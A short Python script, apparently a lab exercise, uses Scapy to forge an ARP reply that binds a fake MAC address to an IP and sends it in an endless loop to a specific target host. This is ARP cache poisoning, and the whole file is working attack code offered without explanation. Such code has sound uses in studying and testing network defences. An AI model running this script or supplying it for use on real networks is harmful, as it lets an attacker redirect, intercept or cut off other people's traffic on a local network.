from scapy.all import *

trame = Ether(type=0x0806)

packet = ARP(op=2, hwsrc="de:ad:be:ef:ca:fe", psrc="10.13.33.37", hwdst="74:56:3c:38:c2:df", pdst="192.168.1.42")

trame = trame / packet

while True:
    sendp(trame)